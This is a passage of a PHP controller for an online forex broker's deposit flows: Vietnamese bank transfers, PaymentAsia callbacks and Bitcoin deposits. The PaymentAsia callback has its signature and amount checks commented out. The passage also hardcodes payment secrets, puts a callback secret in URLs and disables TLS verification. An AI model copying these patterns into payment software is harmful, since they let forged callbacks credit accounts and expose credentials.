                    $data['metadata_description'] = 'Banks of Vietnam';

                    $this->template->title('ForexMart | Deposit - Banks of Vietnam')
                    ->set_layout('internal/main')
                    ->prepend_metadata('')
                    ->build('deposits/vnd_asia', $data);
                }
            } else {
                redirect('signout');
            }
        } else {
            redirect('');
        }
    }

    public function bank_transfer_vnd()
    {
        if (IPLoc::for_vn_only() || FXPP::isVietnamCountry() || IPLoc::Office()) {
//        if($this->session->userdata('account_number') == '58059115' || IPLoc::JustG() ){

            if ($this->session->userdata('logged')) {
                // FXPP::LoginTypeRestriction();

                $user_id = $this->session->userdata('user_id');
                $data['amount'] = $this->input->post_get('amount1', true);
                $data['bounusfiled'] = $this->input->get('bonus', true);
                $data['additional_bonus'] = $this->input->get('addBonus', true);

                //if ($data['amount'] == null) {
                $paymentCurrency = 'VND';
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|xss_clean|non_usd_min_amt_validate[$paymentCurrency]");

                //}
                $this->form_validation->set_rules('first_name', 'First name', 'trim|required');
                $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');

                if ($this->form_validation->run() && !$data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'))) {
                    $this->load->library('PayTrust');
                    if ($user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created')) {
                        $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');

                        $amount = ceil($this->input->post('amount', true));
                        $full_name = $this->input->post('first_name', true);
                        $item_id = 'vnd_'.uniqid();

                        $this->paytrust->setAmount($amount);
                        $this->paytrust->setFullName($full_name);
                        $this->paytrust->setItemId($item_id);
                        $this->paytrust->setCountry('VN');

                        $additional_bonus = $this->validateAdditionalBonus($this->input->get('addBonus', true));

                        $insert_data = [
                            'full_name' => $full_name,
                            'amount' => $amount,
                            'item_id' => $item_id,
                            'bonus' => $this->input->get('bonus', true),
                            'create_date' => date('Y-m-d h:i:s'),
                            'user_id' => $user_id,
                            'additional_tenp_bonus' => $additional_bonus,
                        ];
                        $this->general_model->insertmy('vnd', $insert_data);

                        if ($url = $this->paytrust->mymPay()) {
                            redirect($url); //redirect to the payment gatway page.
                        }
                    }
                }
                $data['full_name'] = $profile['full_name'];
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //    $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status == 'success') {
                    $data['msg'] = 'Transaction successful.';
                } elseif ($status == 'failed') {
                    $data['msg'] = 'Transaction failed.';
                } else {
                    $data['msg'] = '';
                }
                //$account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account'] = $account;
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);
                $data['metadata_description'] = 'Banks of Vietnam';

                $this->template->title('ForexMart | Deposit - Banks of Vietnam')
                        ->set_layout('internal/main')
                        ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                        ->build(FXPP::buildUpPage('deposits/vnd'), $data);
            } else {
                redirect('signout');
            }
        } else {
            redirect('');
        }
    }

    public function bank_transfer_vnd_status()
    {
        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address()];
        $this->general_model->insertmy('vnd_log', $insertData);

        $this->vndDepositProcess($_POST);
    }

    public function payment_asia_callback()
    {
        //$paymentData = json_decode(file_get_contents('php://input'), true);
        $secret = 'd99480f3-9bbb-4d7e-b5c9-5df02a4c7687';

        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address(), 'type' => 'PAYMENTASIA'];
        $this->general_model->insertmy('fasapay_log', $insertData);

//        $data= array();
//        foreach ($paymentData as $_field) {
//            $data = filter_input(INPUT_POST, $_field, FILTER_SANITIZE_STRING);
//        }
//
//        $sign = $data['sign'];
//
//        unset($data['sign']);
//        ksort($data);
//
//        if($sign !== hash('SHA512', http_build_query($data) . $secret)) {
//            exit; // signature validation failed
//        }

//        if (bccomp($order['amount'], $data['amount'], 2) !== 0) {
//            exit; // order amount should be exact match with response amount
//        }
//
//        if ($order['currency'] !== $data['currency']) {
//            exit; // order currency should be exact match with response currency
//        }
//
//        if ($order['id'] !== $data['merchant_reference']) {
//            exit; // order id should be exact match with response merchant_reference
//        }

        $this->vndAsiaDepositProcess($_POST);
    }

    private function vndAsiaDepositProcess(array $vndData)
    {
        if ($vndData['status'] == 1) {
            $paidAmount = ($vndData['amount']);

            $condition_vnd = [  // save only one unique transaction id in the deposit table (task FXPP-11129)
                'transaction_id' => $vndData['merchant_reference'],
                'transaction_type' => 'ASIA_VND',
            ];

            $condition_vnd_v2 = [  // save only one unique transaction id in the vnd table (task FXPP-11129)
                'item_id' => $vndData['merchant_reference'],
                'status' => 1,
            ];

            if ($this->general_model->whereCondition('deposit', $condition_vnd)) {
                return false;
            }

            if ($this->general_model->whereCondition('vnd', $condition_vnd_v2)) {
                return false;
            }

            if ($row = $this->general_model->where('vnd', ['item_id' => $vndData['merchant_reference'], 'status' => 0])) {
                $invData = $row->row_array();

                // if (floatval($invData['amount']) == floatval($vndData['amount'])) {
                $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                //CONVERT VND
                $total_amount = $this->get_convert_amount("VND", $paidAmount, $accData['currency']);
              
                $amount = $total_amount;
                $fee =  0.035 * $amount;

                $currency = $accData['currency'];
                /* FXPP-6333 */
                $currencyStatus = $this->currency_status[$currency];
                $isMicro = $this->account_model->isMicro($invData['user_id']);
                if ($isMicro) {
                    $amount *= 100;
                    $fee *= 100;
                    $total_amount *= 100;
                    $currencyStatus = $this->currency_status['Cents'];
                }


               
                $amount -= $fee;

                $conv_amount = $amount;
                $conv_amount_fee = $fee;
                $conv_amount_fee_usd = $this->get_convert_amount($accData['currency'], $fee);
                $conv_amount_usd = $this->get_convert_amount($accData['currency'], $amount);

                $insertDepositFailed = [
                        'transaction_id	' => $invData['item_id'],
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'ASIA_VND',
                        'payment_status' => $this->paymentType_status['Deposit via PaymentAsia vnd'],
                        'currency_status' => $currencyStatus,
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                $data = [
                        'transaction_id' => $invData['item_id'],
                        'reference_id' => $vndData['merchant_reference'],
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'ASIA_VND deposit',
                        'transaction_type' => 'ASIA_VND',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via PaymentAsia vnd'],
                        'currency_status' => $currencyStatus,
                    ];

                if ($fee > 0) {
                    $data_fee = [
                            'transaction_id' => $invData['item_id'],
                            'reference_id' => $vndData['merchant_reference'],
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $currency,
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => 'ASIA_VND deposit',
                            'transaction_type' => 'ASIA_VND',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $this->paymentType_status['Deposit via PaymentAsia vnd'],
                            'currency_status' => $currencyStatus,
                        ];
                }

                $config = [
                        'server' => 'live_new',
                    ];


                $account_number = $accData['account_number'];

                    $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['ASIA_VND'].$invData['item_id']);
                    $requestResult = $WebServiceNew['requestResult'];
                    $ticket = $WebServiceNew['ticket'];

                if ($requestResult === 'RET_OK') {
                    $data['mt_ticket'] = $ticket;

                    // Back Agent of Client
                   // FXPP::BackAgentOfAccount($account_number);

                } else {
                    $insertDepositFailed['comment'] = $requestResult;
                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                }

                if ($fee > 0) {

                       $account_number = $accData['account_number'];
             
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['ASIA_VND'].$invData['item_id']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];

                    if ($requestResult === 'RET_OK') {
                        $data_fee['mt_ticket'] = $ticket;

                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }
                }

                //$this->SetAccountAgentPotentialFund($account_number);

                $deposit_id = $this->deposit_model->insertPayment($data);
                if ($fee > 0) {
                    $this->deposit_model->insertPayment($data_fee);
                }

                $updateData = ['status' => 1, 'txn_id' => $vndData['request_reference']];
                $this->general_model->updatemy('vnd', 'item_id', $invData['item_id'], $updateData);

//                    FXPP::updateAccountTradingStatus($account_number,$invData['user_id']); // for pro accounts

                /* if(IPLoc::APIUpgradeDevIP()){
                     FXPP::updateAccountTradingStatusV2($account_number,$invData['user_id']); // for pro accounts
                 }else{*/
                FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                // }

                /* ========================================== Welcome bonus================================================ **/

//                if ($invData['bonus'] == 'twpb') {
//                    // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                    FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'ASIA_VND', 'twpb', $data['transaction_id']);
//                }
//
//                if ($invData['bonus'] == 'tpb') {
//                    // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                    FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'ASIA_VND', 'tpb', $data['transaction_id']);
//                }
//                if ($invData['bonus'] == 'fpb') {
//                    // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                    FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'ASIA_VND', 'fpb', $data['transaction_id']);
//                }
//
//                if ($invData['bonus'] == 'hpb') {
//                    // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                    FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'ASIA_VND', 'hplb', $data['transaction_id']);
//                }
//
//                if (IPLoc::Office()) {
//                    if ($invData['bonus'] == 'rhpb') {
//                        FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'ASIA_VND', 'rhpb', $data['transaction_id']);
//                    }
//                }
//
//                if ($invData['additional_tenp_bonus'] == 1) {
//                    // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                    FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'ASIA_VND', 'tenpb', $data['transaction_id']);
//                }

                self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'ASIA_VND', $invData['bonus'], $data['transaction_id'], false);

                if ($invData['additional_tenp_bonus'] == 1) {
                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'ASIA_VND', 'tenpb', $data['transaction_id'], true);
                }

                $bonuses = FXPP::getAccountBonusByType($account_number);
                $qiwi_amount = $paidAmount;
                $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                if ($RequestLogintype['login_type'] != 1) {
                    if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                        FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                    }
                }

                // Bonus Profit Logs**/
                $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $paidAmount,
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                /**=========================================== Welcome bonus end ====================================================**/

                /**  Use original amount for Cent accounts**/
                $isMicro = $this->account_model->isMicro($invData['user_id']);
                $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                if ($isMicro) {
                    $processed_amount /= 100;
                }
                /* End **/
                /* Send successful email deposit to auto-reports **/
                $this->sendEmailAfterSuccessDeposit('ASIA_VND', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['ASIA_VND'].$invData['item_id']);
                /* End **/

               // }
            }
        } else {
            $updateData = ['status' => 2];
            $this->general_model->updatemy('vnd', 'item_id', $vndData['merchant_reference'], $updateData);
        }
    }

    private function vndDepositProcess(array $vndData)
    {
        if ($vndData['status'] == 1) {
            $paidAmount = ($vndData['amount']);

            $condition_vnd = [  // save only one unique transaction id in the deposit table (task FXPP-11129)
                'transaction_id' => $vndData['item_id'],
                'transaction_type' => 'BANK_VND',
            ];

            $condition_vnd_v2 = [  // save only one unique transaction id in the vnd table (task FXPP-11129)
                'item_id' => $vndData['item_id'],
                'status' => 1,
            ];

            if ($this->general_model->whereCondition('deposit', $condition_vnd)) {
                return false;
            }

            if ($this->general_model->whereCondition('vnd', $condition_vnd_v2)) {
                return false;
            }

            if ($row = $this->general_model->where('vnd', ['item_id' => $vndData['item_id'], 'status' => 0])) {
                $invData = $row->row_array();

                // if (floatval($invData['amount']) == floatval($vndData['amount'])) {
                $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                //CONVERT VND
                $total_amount = $this->get_convert_amount('VND', $paidAmount, $accData['currency']);
                $amount = $total_amount;

                $currency = $accData['currency'];
                /* FXPP-6333 */
                $currencyStatus = $this->currency_status[$currency];
                $isMicro = $this->account_model->isMicro($invData['user_id']);
                if ($isMicro) {
                    $amount *= 100;
                    $total_amount *= 100;
                    $currencyStatus = $this->currency_status['Cents'];
                }

                $fee = $this->get_convert_amount('VND', $vndData['total_fees'], $accData['currency']);

                $conv_amount_fee_usd = $this->get_convert_amount($accData['currency'], $fee);

                $amount -= $fee;

                $conv_amount = $amount;
                $conv_amount_fee = $fee;

                $conv_amount_usd = $this->get_convert_amount($accData['currency'], $amount);

                $insertDepositFailed = [
                        'transaction_id	' => $invData['item_id'],
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'BANK_VND',
                        'payment_status' => $this->paymentType_status['Deposit via bank vnd'],
                        'currency_status' => $currencyStatus,
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                $data = [
                        'transaction_id' => $invData['item_id'],
                        'reference_id' => $vndData['item_id'],
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'BANK_VND deposit',
                        'transaction_type' => 'BANK_VND',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via bank vnd'],
                        'currency_status' => $currencyStatus,
                    ];

                if ($fee > 0) {
                    $data_fee = [
                            'transaction_id' => $invData['item_id'],
                            'reference_id' => $vndData['item_id'],
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $currency,
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => 'BANK_VND deposit',
                            'transaction_type' => 'BANK_VND',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $this->paymentType_status['Deposit via bank vnd'],
                            'currency_status' => $currencyStatus,
                        ];
                }

                $config = [
                        'server' => 'live_new',
                    ];
//                $WebService = new WebService($config);

                $account_number = $accData['account_number'];

                // if(IPLoc::APIUpgradeDevIP()){
                $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['BANK_VND'].$invData['item_id']);
                $requestResult = $WebServiceNew['requestResult'];
                $ticket = $WebServiceNew['ticket'];
                /* }else{
                     $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'] . $this->comment_transaction_type['BANK_VND'] . $invData['item_id']);
                     $requestResult = $WebService->request_status;
                     $ticket        = $WebService->get_result('Ticket');
                 }*/

                if ($requestResult === 'RET_OK') {
                    $data['mt_ticket'] = $ticket;

                    // Back Agent of Client
                   // FXPP::BackAgentOfAccount($account_number);
                } else {
                    $insertDepositFailed['comment'] = $requestResult;
                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                }

                if ($fee > 0) {
//                    $WebService = new WebService($config);
                    $account_number = $accData['account_number'];

                    //if(IPLoc::APIUpgradeDevIP()){
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['BANK_VND'].$invData['item_id']);
                    $requestResult = $WebServiceNew['requestResult'];
                    $ticket = $WebServiceNew['ticket'];
                    /*}else{
                        $WebService->update_live_deposit_balance($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'] . $this->comment_transaction_type['BANK_VND'] . $invData['item_id']);
                        $requestResult = $WebService->request_status;
                        $ticket        = $WebService->get_result('Ticket');
                    }*/

                    if ($requestResult === 'RET_OK') {
                        $data_fee['mt_ticket'] = $ticket;
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }
                }

                $this->SetAccountAgentPotentialFund($account_number);

                $deposit_id = $this->deposit_model->insertPayment($data);
                if ($fee > 0) {
                    $this->deposit_model->insertPayment($data_fee);
                }

                $updateData = ['status' => 1, 'txn_id' => $vndData['transaction']];
                $this->general_model->updatemy('vnd', 'item_id', $invData['item_id'], $updateData);

//                    FXPP::updateAccountTradingStatus($account_number,$invData['user_id']); // for pro accounts

                /*if(IPLoc::APIUpgradeDevIP()){
                    FXPP::updateAccountTradingStatusV2($account_number,$invData['user_id']); // for pro accounts
                }else{*/
                FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                // }

                /* ========================================== Welcome bonus================================================ **/

//                if ($invData['bonus'] == 'twpb') {
//                    // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                    FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_VND', 'twpb', $data['transaction_id']);
//                }
//
//                if ($invData['bonus'] == 'tpb') {
//                    // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                    FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_VND', 'tpb', $data['transaction_id']);
//                }
//                if ($invData['bonus'] == 'fpb') {
//                    // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                    FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_VND', 'fpb', $data['transaction_id']);
//                }
//
//                if ($invData['bonus'] == 'hpb') {
//                    // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                    FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $total_amount, 'BANK_VND', 'hplb', $data['transaction_id']);
//                }
//
//                if (IPLoc::Office()) {
//                    if ($invData['bonus'] == 'rhpb') {
//                        FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $total_amount, 'BANK_VND', 'rhpb', $data['transaction_id']);
//                    }
//                }
//
//                if ($invData['additional_tenp_bonus'] == 1) {
//                    // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                    FXPP::DepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_VND', 'tenpb', $data['transaction_id']);
//                }

                self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_VND', $invData['bonus'], $data['transaction_id'], false);

                if ($invData['additional_tenp_bonus'] == 1) {
                    self::applyDepositBonus($invData['user_id'], $account_number, $total_amount, 'BANK_VND', 'tenpb', $data['transaction_id'], true);
                }

                $bonuses = FXPP::getAccountBonusByType($account_number);
                $qiwi_amount = $paidAmount;
                $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                if ($RequestLogintype['login_type'] != 1) {
                    if ($qiwi_amount > 0 and $bonuses[2] > 0) {
                        FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $qiwi_amount, $data['transaction_id']);
                    }
                }

                // Bonus Profit Logs**/
                $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $paidAmount,
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                /**=========================================== Welcome bonus end ====================================================**/

                /**  Use original amount for Cent accounts**/
                $isMicro = $this->account_model->isMicro($invData['user_id']);
                $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd);
                if ($isMicro) {
                    $processed_amount /= 100;
                }
                /* End **/
                /* Send successful email deposit to auto-reports **/
                $this->sendEmailAfterSuccessDeposit('BANK_VND', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['BANK_VND'].$invData['item_id']);
                /* End **/

               // }
            }
        } else {
            $updateData = ['status' => 2];
            $this->general_model->updatemy('vnd', 'item_id', $vndData['item_id'], $updateData);
        }
    }

    public function testemail()
    {
        /* Send successful email deposit to auto-reports **/
        $this->sendEmailAfterSuccessDeposit('QIWI', 1, 58027806, 341981, $this->comment_type['deposit'].$this->comment_transaction_type['QIWI'].'123456789');
        /* End **/
    }

    public function getUserdetails_old($account_number)
    {
        $webservice_config = ['server' => 'live_new'];
        $webService = new WebService($webservice_config);
        $data = ['iLogin' => $account_number];
        $webService->request_account_details($data);
        if ($webService->request_status === 'RET_OK') {
            $data = $webService->get_all_result();
        } else {
            $data = false;
        }

        return $data;
    }

    public function getUserdetails($account_number){ //FXPP-13646

        $newWebService = FXPP::GetAllAccountDetails($account_number);

        if ($newWebService['ErrorMessage'] === 'RET_OK') {
            $data = (array) $newWebService['Data'][0];
        } else {
            $data = false;
        }

        return $data;
    }

    public function local_depositor_myr()
    {
        if (FXPP::isMalaysianCountry() || IPLoc::for_my_only() || IPLoc::Office()) {
            error_reporting(E_ALL);
            ini_set('display_errors', 1);
            if ($this->session->userdata('logged')) {
                $data['active_tab'] = 'finance';
                $data['active_sub_tab'] = 'deposit';

                $this->template->title(lang('dep_tit'))
                    ->set_layout('internal/main')
                    ->prepend_metadata('')
                    ->build('deposits/local_depositor_myr', $data);
            } else {
                redirect('signout');
            }
        } else {
            redirect(FXPP::loc_url('deposit'));
        }
    }

    public function local_depositor_idr()
    {
        if (FXPP::isIndonesianCountry() || IPLoc::for_id_only() || IPLoc::Office()) {
            error_reporting(E_ALL);
            ini_set('display_errors', 1);
            if ($this->session->userdata('logged')) {
                $data['active_tab'] = 'finance';
                $data['active_sub_tab'] = 'deposit';

                $this->template->title(lang('dep_tit'))
                    ->set_layout('internal/main')
                    ->prepend_metadata('')
                    ->build('deposits/local_depositor_idr', $data);
            } else {
                redirect('signout');
            }
        } else {
            redirect(FXPP::loc_url('deposit'));
        }
    }

    public function cryptocurrency_status($order_id = null)
    {
        if ($this->session->userdata('logged')) {
            $data['invData'] = '';
            if ($row = $this->general_model->where('cryptocurrency', ['order_id' => $order_id])) {
                $data['invData'] = $row->row_array();
            }

            $this->template->title('ForexMart | Deposit - Cryptocurrency')
            ->set_layout('internal/main')
            ->prepend_metadata('')
            ->build('deposits/cryptocurrency_status', $data);
        } else {
            redirect(FXPP::loc_url('deposit'));
        }
    }

    public function cryptocurrency()
    {
        if ($this->session->userdata('logged')) {
            $user_id = $this->session->userdata('user_id');

            $data['amount'] = $this->input->post_get('amount1', true);
            $data['bounusfiled'] = $this->input->get('bonus', true);
            $data['additional_bonus'] = $this->input->get('addBonus', true);
            //if ($data['amount'] == null) {
            $this->form_validation->set_rules('currency', 'Currency types', 'trim|required');
            // }

            $data['test'] = '';
            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'), null);

            $data['account_info'] = $this->general_model->whereConditionQuery($user_id);

            if ($this->form_validation->run() && !$data['error_msg']) {
                $currency_types = $this->input->post('currency');
                $invoice_id = 'CRY'.date('Ymdhis').rand(0, 9);
                $secret_code = 'YTGY2343sdfer';
                $my_address = '37sEpgcxb8knet7rFjZ8VXjqR66Xx8ojiJ';
                $my_callback_url = 'https://my.forexmart.com/deposit/cryptocurrency_callback?invoice_id='.$invoice_id.'&secret='.$secret_code.'&currency_types='.$currency_types;
                $api_base = 'https://apirone.com/api/v1/receive';
                $blockchain_root = 'https://apirone.com/api/v1/';

                $curl = curl_init();
                curl_setopt_array($curl, [
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_URL => $api_base.'?method=create&currency='.$currency_types.'&address='.$my_address.'&callback='.urlencode($my_callback_url),
                ]);
                $response = curl_exec($curl);
                $http_status_code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
                curl_close($curl);

                if ($http_status_code == 200) {
                    $decoded = json_decode($response, true);
                    $data['display_massage'] = 'Please send the payment to the following bitcoin address: '.$decoded['input_address'].'<p align="center"><img src="'.$blockchain_root.'qr?message='.urlencode('bitcoin:'.$decoded['input_address']).'&format=png'.'" width="300" alt="QR code"></p>';

                    $additional_bonus = $this->validateAdditionalBonus($data['additional_bonus']);

                    $insertData = [
                        'input_address' => $decoded['input_address'],
                        'order_id' => $invoice_id,
                        'bonus' => $data['bounusfiled'],
                        'create_date' => date('Y-m-d h:i:s'),
                        'user_id' => $user_id,
                        'additional_tenp_bonus' => $additional_bonus,
                        'ip_address'=>$this->input->ip_address()
                    ];

                    $this->general_model->insertmy('cryptocurrency', $insertData);

                    redirect(FXPP::loc_url('deposit/cryptocurrency-status/'.$invoice_id));
                } else {
                    $data['display_massage'] = 'Sorry, an error occurred: '.$response;
                }
            }
            if ($this->session->userdata('login_type') == 1) {
                $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            }
            $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
            $data['account'] = $account;
            $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';
            $this->template->title('ForexMart | Deposit - Cryptocurrency')
                    ->set_layout('internal/main')
                    ->prepend_metadata('')
                    ->build('deposits/cryptocurrency', $data);
        } else {
            redirect('signout');
        }
    }

    public function cryptocurrency_callback()
    {
        $insertData = ['log' => serialize($_GET), 'ip' => $this->input->ip_address(), 'type' => 'bitcoin'];
        $this->general_model->insertmy('cryptocurrency_log', $insertData);

        $secret = 'YTGY2343sdfer';
        if ($_GET['secret'] !== $secret) {
            die();
        }

        $my_address = '37sEpgcxb8knet7rFjZ8VXjqR66Xx8ojiJ';
        if ($_GET['destination_address'] !== $my_address) {
            die();
        }

        $usd_amount = $this->bitcoinToUSD('btc', $_GET['value']);
        $usd_amount_forwarded = $this->bitcoinToUSD('btc', $_GET['value_forwarded']);

        $paymentGetwayData = [
             'order_id' => $_GET['invoice_id'],
             'status' => 1,
              'input_transaction_hash' => $_GET['input_transaction_hash'],
              'transaction_hash' => $_GET['transaction_hash'],
              'amount' => $usd_amount,
              'usd_amount_forwarded' => $usd_amount_forwarded,
             ];

        if ($_GET['confirmations'] >= 3) {
            $this->cryptocurrencyDepositProcess($paymentGetwayData);
            header('Content-Type: text/plain');
            echo '*ok*';
        }
    }

    public function bitcoinToWalletCurrency($currency_type = 'bit', $wallet_currency = 'USD', $bitcoin_amount)
    {
        if ($this->input->is_ajax_request()) {
            echo FXPP::bitcoinToWalletCurrency($wallet_currency, $bitcoin_amount);
        } else {
            echo 0;
        }
    }

    public function WalletCurrencyToBitcoin($wallet_currency = 'USD', $wallet_amount = 0)
    {
        if ($this->input->is_ajax_request()) {
            echo  FXPP::WalletCurrencyToBitcoin($wallet_currency, $wallet_amount);
        } else {
            echo 0;
        }
    }

    private function bitcoinToUSD($currency_type = 'btc', $satosi_value)
    {
        $arrContextOptions = stream_context_create([
            'ssl' => [
                 'verify_peer' => false,
                 'verify_peer_name' => false,
            ], ]);

        $data = file_get_contents('https://apirone.com/api/v1/ticker?currency='.$currency_type, false, $arrContextOptions);
        $respond = json_decode($data, true);
        $usd = $respond['USD']['last']; // Exchange rate bitcoin to USD
        $bit_coin = ($satosi_value / 100000000);

        $to_usd = ($bit_coin * $usd);

        $log_data = [
            'log' => 'Satosi'.$satosi_value.'to  bitcoin '.$bit_coin.'>> USD '.$usd,
            'amount' => $to_usd,
            'currency' => 'usd',
            'user_id' => $this->session->userdata('user_id'), ];

        $this->general_model->insertmy('convert_amount_log', $log_data);

        return $to_usd;
    }

    public function unitTestCrypt()
    {
